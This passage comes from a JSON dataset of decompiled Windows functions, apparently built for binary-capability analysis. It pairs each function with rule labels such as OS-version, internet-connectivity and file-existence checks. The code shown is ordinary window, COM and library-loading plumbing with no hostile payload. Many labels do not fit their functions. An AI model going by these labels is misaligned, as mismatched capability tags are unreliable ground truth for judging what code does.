}\n            else if (*apiStack168[0] == 0x4008) {\n                piVar5 = apiStack168[0][1];\n            }\n            else {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(apiStack168[0]);\n                piVar5 = apiStack168[0] + 1;\n                *apiStack168[0] = 8;\n            }\n            iStack200 = *apiStack168[1];\n            iStack192 = apiStack168[1][1];\n            iStack184 = apiStack168[1][2];\n            iVar3 = (**(*arg1 + 0x80))(arg1, piVar5, &iStack200, puVar6 + 4);\n            goto code_r0x0001400089c0;\n        }\n        break;\n    case 0x14000866a:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x78))(arg1, &iStack200, puVar6 + 4);\n            goto code_r0x0001400088a4;\n        }\n        break;\n    case 0x1400086ac:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x70))(arg1, &iStack200, puVar6);\n            goto code_r0x0001400089f0;\n        }\n        break;\n    case 0x1400086ed:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x68))(arg1, &iStack200, puVar6);\n            goto code_r0x0001400089f0;\n        }\n        break;\n    case 0x14000872e:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x60))(arg1, &iStack200, puVar6 + 4);\n            goto code_r0x0001400088a4;\n        }\n        break;\n    case 0x140008770:\n        if ((in_stack_00000028 & 2) == 0) {\n            if ((in_stack_00000028 & 4) == 0) goto code_r0x00014000885d;\n            if (*(in_stack_00000030 + 2) == 2) {\n                iStack200 = *apiStack168[0];\n                iStack192 = apiStack168[0][1];\n                iStack184 = apiStack168[0][2];\n                if (*apiStack168[1] != 8) {\n                    iVar3 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(aiStack128, apiStack168[1], 0, 3);\n                    if (iVar3 < 0) goto code_r0x00014000891c;\n                    apiStack168[1] = aiStack128;\n                }\n                iStack104 = iStack200;\n                iStack96 = iStack192;\n                iStack88 = iStack184;\n                iVar3 = (**(*arg1 + 0xd8))(arg1, &iStack104, apiStack168[1][1]);\n                goto code_r0x0001400089f0;\n            }\n        }\n        else if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x58))(arg1, &iStack200, puVar6 + 4);\n            goto code_r0x0001400088a4;\n        }\n        break;\n    case 0x14000885d:\ncode_r0x00014000885d:\n        if ((in_stack_00000028 & 2) == 0) {\n            if ((in_stack_00000028 & 4) == 0) goto code_r0x00014000896a;\n            if (*(in_stack_00000030 + 2) == 2) {\n                iStack104 = *apiStack168[0];\n                iStack96 = apiStack168[0][1];\n                iStack88 = apiStack168[0][2];\n                if (*apiStack168[1] != 8) {\n                    iVar3 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(aiStack128, apiStack168[1], 0, 3);\n                    if (iVar3 < 0) goto code_r0x00014000891c;\n                    apiStack168[1] = aiStack128;\n                }\n                iStack200 = iStack104;\n                iStack192 = iStack96;\n                iStack184 = iStack88;\n                iVar3 = (**(*arg1 + 0xd0))(arg1, &iStack200, apiStack168[1][1]);\n                goto code_r0x0001400089f0;\n            }\n        }\n        else if (*(in_stack_00000030 + 2) == 1) {\n            iStack104 = *apiStack168[0];\n            iStack96 = apiStack168[0][1];\n            iStack88 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x50))(arg1, &iStack104, puVar6 + 4);\n            goto code_r0x0001400088a4;\n        }\n        break;\n    case 0x14000896a:\ncode_r0x00014000896a:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack104 = *apiStack168[0];\n            iStack96 = apiStack168[0][1];\n            iStack88 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x48))(arg1, &iStack104, puVar6 + 4);\n            goto code_r0x0001400089e1;\n        }\n        break;\n    case 0x1400089b2:\n        iVar3 = (**(*arg1 + 0x40))(arg1, puVar6 + 4);\ncode_r0x0001400089c0:\n        if (-1 < iVar3) {\n            *puVar6 = 3;\n        }\n        goto code_r0x0001400089f0;\n    case 0x1400089d3:\n        iVar3 = (**(*arg1 + 0x38))(arg1, puVar6 + 4);\ncode_r0x0001400089e1:\n        if (-1 < iVar3) {\n            *puVar6 = 9;\n        }\n        goto code_r0x0001400089f0;\n    }\n    iVar3 = -0x7ffdfff2;\ncode_r0x0001400089f0:\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(aiStack128);\n    return iVar3;\n}\n",
        "token_count": 4129
    },
    "140008dd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * fcn.140008dde(int32_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    while( true ) {\n        if (*(arg1 + 4) == 0) {\n            return NULL;\n        }\n        if ((((*arg1 == arg2) && (arg1[1] == arg3)) && (arg1[2] <= arg4)) && (arg4 < arg1[3] || arg4 == arg1[3])) break;\n        arg1 = arg1 + 8;\n    }\n    return arg1;\n}\n",
        "token_count": 128
    },
    "1400093e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint16_t fcn.1400093e4(ulong arg1)\n\n{\n    int16_t iVar1;\n    int16_t extraout_AX;\n    int16_t extraout_AX_00;\n    uint extraout_EAX;\n    int32_t iVar2;\n    uint extraout_var;\n    uint uVar3;\n    ulong in_R8;\n    ulong in_R9;\n    bool bVar4;\n    ulong auStackX24 [2];\n    \n    auStackX24[0] = 0;\n    fcn.140006c48();\n    iVar2 = fcn.14000601c(*(CONCAT44(extraout_var, extraout_EAX) + 0xd8), auStackX24);\n    iVar1 = iVar2;\n    uVar3 = 0;\n    if ((iVar2 != 0) && (iVar1 = (*_sym.imp.USER32.dll_RegisterClassA)(arg1),  iVar2 != 2)) {\n        bVar4 = iVar1 == 0;\n        if (bVar4) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.140006000(0, auStackX24[0], in_R8, in_R9, iVar1);\n        iVar1 = extraout_AX;\n        if (bVar4) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar3);\n            iVar1 = extraout_AX_00;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 321
    },
    "14000948": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint64_t fcn.140009480(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    ulong in_R9;\n    ulong uStack16;\n    \n    uStack16 = 0;\n    iVar4 = fcn.140006c48();\n    uVar5 = fcn.14000601c(*(iVar4 + 0xd8), &uStack16);\n    iVar1 = uVar5;\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.USER32.dll_GetClassInfoA)(arg1, arg2, arg3, in_R9, 0);\n        uVar5 = uVar2;\n        if (iVar1 != 2) {\n            if (uVar2 != 0) {\n                uVar3 = 0;\n            }\n            else {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            fcn.140006000(0, uStack16);\n            if (uVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_SetLastError)(uVar3);\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 285
    },
    "14000952": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint64_t fcn.14000952c(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    ulong in_R9;\n    ulong uStack16;\n    \n    uStack16 = 0;\n    iVar4 = fcn.140006c48();\n    uVar5 = fcn.14000601c(*(iVar4 + 0xd8), &uStack16);\n    iVar1 = uVar5;\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.USER32.dll_GetClassInfoExA)(arg1, arg2, arg3, in_R9, 0);\n        uVar5 = uVar2;\n        if (iVar1 != 2) {\n            if (uVar2 != 0) {\n                uVar3 = 0;\n            }\n            else {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            fcn.140006000(0, uStack16);\n            if (uVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_SetLastError)(uVar3);\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 287
    },
    "1400095d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint64_t fcn.1400095d8(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int64_t iVar3;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    uint in_stack_00000038;\n    uint in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong uStack32;\n    int64_t iStack24;\n    \n    uStack32 = 0;\n    iVar3 = fcn.140006c48();\n    iVar1 = fcn.14000601c(*(iVar3 + 0xd8), &uStack32);\n    iStack24 = 0;\n    if (iVar1 == 0) {\n        iVar3 = 0;\n    }\n    else {\n        iVar3 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                          (arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                           in_stack_00000040, in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060\n                           , iVar1);\n        if (iVar1 != 2) {\n            iStack24 = iVar3;\n            if (iVar3 != 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            fcn.140006000(0, uStack32);\n            if (iVar3 == 0) {\n                (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 416
    },
    "14000970": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint64_t fcn.140009704(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    ulong uStack16;\n    \n    uStack16 = 0;\n    iVar4 = fcn.140006c48();\n    uVar5 = fcn.14000601c(*(iVar4 + 0xd8), &uStack16);\n    iVar1 = uVar5;\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.USER32.dll_MessageBoxA)(arg1, arg2, arg3, arg4, 0);\n        uVar5 = uVar2;\n        if (iVar1 != 2) {\n            if (uVar2 != 0) {\n                uVar3 = 0;\n            }\n            else {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            fcn.140006000(0, uStack16);\n            if (uVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_SetLastError)(uVar3);\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 281
    },
    "1400097b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint64_t fcn.1400097bc(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int64_t iVar3;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uStackX24;\n    int64_t iVar4;\n    \n    uStackX24 = 0;\n    iVar3 = fcn.140006c48();\n    iVar1 = fcn.14000601c(*(iVar3 + 0xd8), &uStackX24);\n    if (iVar1 == 0) {\n        iVar3 = 0;\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(arg1);\n        if (iVar1 != 2) {\n            iVar4 = iVar3;\n            if (iVar3 != 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            fcn.140006000(0, uStackX24, in_R8, in_R9, iVar4);\n            if (iVar3 == 0) {\n                (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 274
    },
    "14000985": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140009858(ulong *arg1)\n\n{\n    if (*(arg1 + 1) != 0) {\n        fcn.140006000(0, *arg1);\n    }\n    return;\n}\n",
        "token_count": 49
    },
    "14000b00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong * fcn.14000b000(int64_t lpModuleName, ulong *arg2)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    if (*(lpModuleName + 0x20) == 0) {\n        if (*(lpModuleName + 8) == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(*(lpModuleName + 0x18));\n            *(lpModuleName + 8) = iVar1;\n            if (iVar1 == 0) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(*(lpModuleName + 0x18));\n                *(lpModuleName + 8) = iVar1;\n                *(lpModuleName + 0x10) = iVar1 != 0;\n            }\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*(lpModuleName + 8), \"InitCommonControls\");\n        *(lpModuleName + 0x20) = uVar2;\n    }\n    *arg2 = *(lpModuleName + 0x20);\n    return arg2;\n}\n",
        "token_count": 237
    },
    "14000b07": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.14000b074(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    ulong uStackX24;\n    uchar auStackX32 [8];\n    \n    uStackX24 = 0;\n    iVar1 = fcn.140006c48();\n    iVar2 = fcn.14000601c(*(iVar1 + 0xd8), &uStackX24);\n    if (iVar2 != 0) {\n        fcn.14000b000(arg1, auStackX32);\n        pcVar3 = *(arg1 + 0x20);\n        if (pcVar3 == NULL) {\n            fcn.140005e30();\n        }\n        (*pcVar3)();\n        if (iVar2 != 2) {\n            fcn.140006000(0, uStackX24);\n        }\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "14000b0e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong * fcn.14000b0ec(int64_t lpModuleName, ulong *arg2)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    if (*(lpModuleName + 0x28) == 0) {\n        if (*(lpModuleName + 8) == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(*(lpModuleName + 0x18));\n            *(lpModuleName + 8) = iVar1;\n            if (iVar1 == 0) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(*(lpModuleName + 0x18));\n                *(lpModuleName + 8) = iVar1;\n                *(lpModuleName + 0x10) = iVar1 != 0;\n            }\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*(lpModuleName + 8), \"InitCommonControlsEx\");\n        *(lpModuleName + 0x28) = uVar2;\n    }\n    *arg2 = *(lpModuleName + 0x28);\n    return arg2;\n}\n",
        "token_count": 239
    },
    "14000b16": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint64_t fcn.14000b160(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    ulong in_R8;\n    ulong in_R9;\n    code *pcVar6;\n    bool bVar7;\n    ulong uStackX32;\n    uchar auStack16 [8];\n    \n    uStackX32 = 0;\n    iVar4 = fcn.140006c48();\n    uVar5 = fcn.14000601c(*(iVar4 + 0xd8), &uStackX32);\n    iVar1 = uVar5;\n    if (iVar1 != 0) {\n        fcn.14000b0ec(arg1, auStack16);\n        pcVar6 = *(arg1 + 0x28);\n        if (pcVar6 == NULL) {\n            fcn.140005e30();\n        }\n        uVar2 = (*pcVar6)(arg2);\n        uVar5 = uVar2;\n        if (iVar1 != 2) {\n            bVar7 = uVar2 != 0;\n            if (bVar7) {\n                uVar3 = 0;\n            }\n            else {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            fcn.140006000(0, uStackX32, in_R8, in_R9, uVar2);\n            if (!bVar7) {\n                (*_sym.imp.KERNEL32.dll_SetLastError)(uVar3);\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 363
    },
    "14000b4b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.14000b4b4(void)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    bool bVar5;\n    \n    iVar2 = fcn.140015718(0x14004fe50, 0x140005e54);\n    if (iVar2 != 0) {\n        iVar4 = fcn.140006c48();\n        if ((*(iVar4 + 0x28) != '\\0') && (*(iVar2 + 0x48) != 0)) {\n            (*_sym.imp.USER32.dll_UnhookWindowsHookEx)();\n            *(iVar2 + 0x48) = 0;\n        }\n        bVar5 = *(iVar2 + 0x28) == 0;\n        if (!bVar5) {\n            *(iVar2 + 0x28) = 0;\n        }\n        return bVar5;\n    }\n    fcn.140005e30();\n    pcVar1 = swi(3);\n    uVar3 = (*pcVar1)();\n    return uVar3;\n}\n",
        "token_count": 247
    },
    "14000bc5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.14000bc5c(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    ulong in_stack_00000028;\n    uint32_t auStack120 [2];\n    int64_t iStack112;\n    ulong uStack104;\n    uchar auStack96 [24];\n    uchar auStack72 [48];\n    \n    uStack104 = 0xfffffffffffffffe;\n    iVar3 = fcn.140015718(0x14004fe50, 0x140005e54);\n    iStack112 = iVar3;\n    if (iVar3 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        uVar4 = (*pcVar1)();\n        return uVar4;\n    }\n    fcn.14001c2b0(auStack72, iVar3 + 0x98, 0x30);\n    *(iVar3 + 0x98) = arg2;\n    *(iVar3 + 0xa0) = arg3;\n    *(iVar3 + 0xa8) = arg4;\n    *(iVar3 + 0xb0) = in_stack_00000028;\n    if ((arg3 == 2) && (arg1[0x13] != 0)) {\n        (**(*arg1[0x13] + 0xc0))(arg1[0x13], 0);\n    }\n    auStack120[0] = 0;\n    if (arg3 == 0x110) {\n        fcn.1400098e8(arg1, auStack96, auStack120);\n    }\n    uVar2 = auStack120[0];\n    uVar4 = (**(*arg1 + 0x220))(arg1, arg3, arg4, in_stack_00000028);\n    if (arg3 == 0x110) {\n        fcn.14000bbc4(arg1, auStack96, uVar2);\n    }\n    fcn.14001c2b0(iVar3 + 0x98, auStack72, 0x30);\n    return uVar4;\n}\n",
        "token_count": 494
    },
    "14000c01": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.14000c01c(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    int32_t iVar1;\n    int64_t *piVar2;\n    \n    if ((arg1 == NULL) || (arg1[8] == 0)) {\n        arg1 = NULL;\n    }\n    else {\n        iVar1 = (**(*arg1 + 0x250))();\n        piVar2 = arg1;\n        if (iVar1 == 0) {\n            arg1 = fcn.14000bfcc(arg1);\n            piVar2 = arg1;\n        }\n        while (arg1_00 = piVar2,  arg1_00 != NULL) {\n            piVar2 = fcn.14000bfcc(arg1_00);\n            arg1 = arg1_00;\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 193
    },
    "14000c29": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14000c294(int64_t *arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    uVar1 = fcn.14000b408(arg1, arg2);\n    if (uVar1 != 0) {\n        (**(*arg1 + 0xa0))(arg1);\n        piVar2 = (**(*arg1 + 0x1f0))(arg1);\n        iVar3 = (*_sym.imp.USER32.dll_SetWindowLongPtrA)(arg2, 0xfffffffc, 0x14000bdbc);\n        if (*piVar2 == 0) {\n            *piVar2 = iVar3;\n        }\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 179
    },
    "14000ca5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14000ca50(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    \n    fcn.140016f8c(0xc);\n    iVar2 = fcn.14001503c(0x1400532c0, 0x14000bb9c);\n    if (iVar2 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        uVar3 = (*pcVar1)();\n        return uVar3;\n    }\n    if (*(iVar2 + 0x10) == 0) {\n        iVar4 = fcn.1400097bc(\"hhctrl.ocx\");\n        *(iVar2 + 8) = iVar4;\n        if (iVar4 != 0) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar4, \"HtmlHelpA\");\n            *(iVar2 + 0x10) = iVar4;\n            if (iVar4 != 0) goto code_r0x00014000caea;\n            (*_sym.imp.KERNEL32.dll_FreeLibrary)(*(iVar2 + 8));\n            *(iVar2 + 8) = 0;\n        }\n        uVar3 = 0;\n    }\n    else {\ncode_r0x00014000caea:\n        fcn.140017020(0xc);\n        uVar3 = (**(iVar2 + 0x10))(arg1, arg2, arg3, arg4);\n    }\n    return uVar3;\n}\n",
        "token_count": 359
    },
    "14000d69": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14000d690(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    iVar3 = fcn.140015718(0x14004fe50, 0x140005e54);\n    if (iVar3 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (*(iVar3 + 0x28) != arg1) {\n        if (*(iVar3 + 0x48) == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            iVar4 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(5, 0x14000d38c, 0, uVar2);\n            *(iVar3 + 0x48) = iVar4;\n            if (iVar4 == 0) {\n                fcn.140005de8();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        *(iVar3 + 0x28) = arg1;\n    }\n    return;\n}\n",
        "token_count": 270
    },
    "14000d99": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14000d994(int64_t *arg1, ulong arg2, uint64_t arg3, int64_t *arg4)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    ulong uVar6;\n    code **ppcVar7;\n    uchar *puVar8;\n    int64_t iVar9;\n    ulong uVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    int16_t iVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    uint64_t *in_stack_00000028;\n    uint64_t *in_stack_fffffffffffffee8;\n    uint64_t uStack264;\n    int32_t iStack256;\n    int32_t iStack252;\n    uint uStack248;\n    uchar auStack240 [8];\n    int64_t iStack232;\n    ulong uStack208;\n    uchar auStack200 [64];\n    int64_t iStack136;\n    int64_t iStack40;\n    \n    uStack208 = 0xfffffffffffffffe;\n    uStack264 = 0;\n    uStack248 = 0x7fffffff;\n    if (arg2 == 0x111) {\n        iVar4 = (**(*arg1 + 0x1e0))(arg1, arg3, arg4);\n        if (iVar4 == 0) {\n            return 0;\n        }\n        uStack264 = 1;\n    }\n    else if (arg2 == 0x4e) {\n        if ((*arg4 == 0) || (iVar4 = (**(*arg1 + 0x1e8))(arg1, arg3, arg4, &uStack264),  iVar4 == 0)) {\n            return 0;\n        }\n    }\n    else {\n        if (arg2 == 6) {\n            uVar6 = fcn.14000b398(arg4);\n            fcn.14000d0d4(arg1, arg3, uVar6);\n        }\n        iVar13 = arg4;\n        if ((arg2 == 0x20) && (iVar4 = fcn.14000d178(arg1, iVar13, arg4 >> 0x10 & 0xffff),  iVar4 != 0)) {\n            uStack264 = 1;\n        }\n        else {\n            if (((arg1[0x13] != 0) && (0 < *(arg1[0x13] + 0xe0))) &&\n               ((((0x1ff < arg2 && (arg2 < 0x20a)) || ((0xff < arg2 && (arg2 < 0x110)))) || (arg2 - 0x281 < 0x11)))) {\n                in_stack_fffffffffffffee8 = &uStack264;\n                iVar4 = (**(*arg1[0x13] + 0x128))(arg1[0x13], arg2, arg3, arg4, in_stack_fffffffffffffee8);\n                if (iVar4 != 0) goto code_r0x00014000e727;\n            }\n            ppcVar7 = (**(*arg1 + 0x50))();\n            uVar12 = (ppcVar7 ^ arg2) & 0x1ff;\n            uStack248 = 7;\n            fcn.140016f8c(7);\n            uVar11 = 0x14004ffb0;\n            if ((arg2 != *(uVar12 * 0x18 + 0x14004ffb0)) || (ppcVar7 != *(uVar12 * 0x18 + 0x14004ffc0))) {\n                *(uVar12 * 0x18 + 0x14004ffb0) = arg2;\n                *(uVar12 * 0x18 + 0x14004ffc0) = ppcVar7;\n                pcVar2 = *ppcVar7;\n                do {\n                    if (pcVar2 == NULL) {\n                        *(uVar12 * 0x18 + 0x14004ffb8) = 0;\n                        fcn.140017020(7);\n                        return 0;\n                    }\n                    if (arg2 < 0xc000) {\n                        puVar14 = ppcVar7[1];\n                        iVar9 = *(puVar14 + 4);\n                        for (; (puVar15 